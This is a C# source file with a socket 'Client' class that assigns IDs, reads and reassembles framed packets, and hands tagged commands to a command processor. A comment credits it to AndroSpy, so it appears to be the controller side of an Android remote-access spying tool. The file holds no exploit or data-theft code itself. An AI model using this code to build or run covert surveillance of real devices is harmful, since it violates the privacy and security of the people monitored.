 using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace Server.Connection
{
    class Client : IDisposable
    {
        private MemoryStream memos = new MemoryStream();
        private byte[] dataByte = new byte[8192]; //1024 * 8
        private int blockSize = 8192;
        public Socket sck = default;
        int id;
        private string ip;


        public Client(Socket sck, int id)
        {
            this.sck = sck;
            this.id = id;

            HandleForm.WriteTextBox(sck, "Connected");

            //UTF8
            byte[] data = Listener.MyDataPacker("ID", Encoding.UTF8.GetBytes(id.ToString()));
            sck.Send(data, 0, data.Length, SocketFlags.None);

            Read(sck);
        }

        private async void Read(Socket client)
        {
            int readed = default;
            while (true)
            {
                try
                {
                    readed = client.Receive(dataByte, 0, blockSize, SocketFlags.None);
                    if (readed > 0)
                    {
                        if (memos != null)
                        {
                            memos.Write(dataByte, 0, readed);
                            UnPacker(client, memos);
                        }

                    }
                }
                catch (Exception) { break; }
                await Task.Delay(1);
            }
        }

        public void Send(byte[] data)
        {
            sck.Send(data, 0, data.Length, SocketFlags.None);
        }


        private void UnPacker(Socket sck, MemoryStream ms)
        {
            //YEDEK REGEX: <[A-Z]+>\|[0-9]+\|.*?>
            //This unpacker coded by qH0sT' - 2021 - AndroSpy.
            //string letter = "qwertyuıopğüasdfghjklşizxcvbnmöç1234567890<>|";
            Regex regex = new Regex(@"<[A-Z]+>\|[0-9]+\|.*>");

            byte[][] filebytes = Separate(ms.ToArray(), Encoding.UTF8.GetBytes("SUFFIX"));
            for (int k = 0; k < filebytes.Length; k++)
            {
                if (!(filebytes[k].Length <= 0))
                {
                    try
                    {
                        string ch = Encoding.UTF8.GetString(new byte[1] { filebytes[k][filebytes[k].Length - 1] });// >
                        string f = Encoding.UTF8.GetString(new byte[1] { filebytes[k][filebytes[k].Length - 2] });// F>
                        string o = Encoding.UTF8.GetString(new byte[1] { filebytes[k][filebytes[k].Length - 3] });// OF>
                        string e = Encoding.UTF8.GetString(new byte[1] { filebytes[k][filebytes[k].Length - 4] });// EOF>
                        string ch_ = Encoding.UTF8.GetString(new byte[1] { filebytes[k][filebytes[k].Length - 5] });// <EOF>

                        bool isContainsEof = (ch_ + e + o + f + ch) == "<EOF>";
                        if (isContainsEof)
                        {
                            List<byte> mytagByte = new List<byte>();
                            string temp = "";
                            for (int p = 0; p < filebytes[k].Length; p++)
                            {
                                //if (letter.Contains(Encoding.UTF8.GetString(new byte[1] { filebytes[k][p] }).ToLower()))
                                //{
                                temp += Encoding.UTF8.GetString(new byte[1] { filebytes[k][p] });
                                mytagByte.Add(filebytes[k][p]);
                                if (regex.IsMatch(temp))
                                {
                                    break;
                                }
                                //}
                            }
                            string whatsTag = Encoding.UTF8.GetString(mytagByte.ToArray());

                            MemoryStream tmpMemory = new MemoryStream();
                            tmpMemory.Write(filebytes[k], 0, filebytes[k].Length);
                            tmpMemory.Write(Encoding.UTF8.GetBytes("SUFFIX"), 0, Encoding.UTF8.GetBytes("SUFFIX").Length);
                            ms.Flush();
                            ms.Close();
                            ms.Dispose();
                            ms = new MemoryStream(RemoveBytes(ms.ToArray(), tmpMemory.ToArray()));
                            memos = new MemoryStream();
                            ms.CopyTo(memos);
                            tmpMemory.Flush();
                            tmpMemory.Close();
                            tmpMemory.Dispose();
                            filebytes[k] = RemoveBytes(filebytes[k], mytagByte.ToArray());
                            filebytes[k] = RemoveBytes(filebytes[k], Encoding.UTF8.GetBytes("<EOF>"));

                            CommandReader.DataProcess(sck, whatsTag, filebytes[k], this);
                        }
                    }
                    catch (Exception) { }
                }
            }
        }
        private byte[][] Separate(byte[] source, byte[] separator)
        {
            var Parts = new List<byte[]>();
            var Index = 0;
            byte[] Part;
            for (var I = 0; I < source.Length; ++I)
            {
                if (Equals(source, separator, I))
                {
                    Part = new byte[I - Index];
                    Array.Copy(source, Index, Part, 0, Part.Length);
                    Parts.Add(Part);
                    Index = I + separator.Length;
                    I += separator.Length - 1;
                }
            }
            Part = new byte[source.Length - Index];
            Array.Copy(source, Index, Part, 0, Part.Length);
            Parts.Add(Part);
            return Parts.ToArray();
        }
        private bool Equals(byte[] source, byte[] separator, int index)
        {
            for (int i = 0; i < separator.Length; ++i)
                if (index + i >= source.Length || source[index + i] != separator[i])
                    return false;
            return true;
        }
        private byte[] RemoveBytes(byte[] input, byte[] pattern)
        {
            if (pattern.Length == 0) return input;
            var result = new List<byte>();
            for (int i = 0; i < input.Length; i++)
            {
                var patternLeft = i <= input.Length - pattern.Length;
                if (patternLeft && (!pattern.Where((t, j) => input[i + j] != t).Any()))
                {
                    i += pattern.Length - 1;
                }
                else
                {
                    result.Add(input[i]);
                }
            }
            return result.ToArray();
        }

        public void CloseSocks()
        {
            if (sck != null)
            {
                try { Listener.receiveClasses.Remove(sck.Handle.ToString()); } catch (Exception) { }
                try { sck.Close(); } catch (Exception) { }
                try { sck.Dispose(); } catch (Exception) { }
            }
            try { memos.Flush(); memos.Close(); memos.Dispose(); } catch (Exception) { }
            try { Dispose(); } catch (Exception) { }
        }
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }
        protected bool Disposed { get; private set; }
        protected virtual void Dispose(bool disposing)
        {
            Disposed = true;
        }
    }
}
